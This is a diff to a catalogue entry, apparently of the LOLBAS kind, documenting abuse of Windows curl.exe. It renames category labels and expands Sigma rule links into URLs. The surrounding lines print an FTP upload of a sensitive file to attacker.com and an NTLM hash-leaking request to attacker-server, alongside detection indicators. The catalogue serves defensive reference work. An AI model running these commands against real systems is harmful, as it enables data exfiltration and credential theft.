@@ -16,7 +16,7 @@ Commands:
   - Command: curl.exe -T C:\path\to\sensitive_data.zip ftp://attacker.com/upload/
     Description: Uploads a specified local file to a remote server via FTP/HTTP.
     Usecase: Exfiltrate sensitive data or system information out of the network.
-    Category: Exfiltration
+    Category: Upload
     Privileges: User
     MitreID: T1048.003
     OperatingSystem: Windows 10, Windows 11, Windows Server 2019, Windows Server 2022
@@ -34,7 +34,7 @@ Commands:
   - Command: 'curl.exe -u : --ntlm http://attacker-server/'
     Description: Forces NTLM authentication using the current Windows user's context (via SSPI) against a remote server. This leaks the user's NetNTLM hash to the remote host.
     Usecase: Forced authentication to capture NetNTLM hashes for cracking or SMB relaying.
-    Category: Credential Access
+    Category: Credentials
     Privileges: User
     MitreID: T1187
     OperatingSystem: Windows 10, Windows 11, Windows Server 2019, Windows Server 2022
@@ -45,9 +45,9 @@ Full_Path:
   - Path: C:\Windows\SysWOW64\curl.exe
 Code_Sample: []
 Detection:
-  - Sigma: proc_creation_win_curl_susp_download.yml
-  - Sigma: proc_creation_win_susp_curl_execution.yml
-  - Sigma: proc_creation_win_curl_ntlm_leak.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_curl_susp_download.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_curl_execution.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_curl_ntlm_leak.yml
   - IOC: Monitor curl.exe usage containing `--ntlm` or `-u :` pointing to external, untrusted, or non-internal IP addresses.
   - IOC: Monitor curl.exe processes making outbound connections to unverified or public file-sharing IPs/domains.
   - IOC: Monitoring command lines where curl.exe is piped directly into interpreters like cmd.exe or powershell.exe.
